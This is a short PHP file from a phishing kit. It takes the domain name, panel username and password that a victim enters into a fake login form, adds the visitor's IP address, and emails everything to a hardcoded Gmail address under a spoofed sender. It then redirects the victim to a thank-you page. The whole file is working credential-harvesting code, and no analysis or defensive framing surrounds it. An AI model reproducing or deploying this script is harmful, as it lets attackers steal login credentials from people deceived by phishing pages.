<?

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Created By LEGEND-------------------------\n";
$message .= " \n";
$message .= "Domain name: ".$_POST['userid']."\n";
$message .= "Panel username: ".$_POST['formtext2']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= " \n";
$message .= "IP: ".$ip."\n";
$message .= " \n";
$message .= "---------------Created By LEGEND-------------------------\n";
$recipient = "tngilroy1@gmail.com";
$subject = "GMAIL Result from";
$headers = "From: GMAIL<rezultz@Suntrust.pot>";
$headers .= $_POST['eMailAdd']."\n";
if (mail($recipient,$subject,$message, $headers))
{
header("Location: thankyou.html");
}
?>
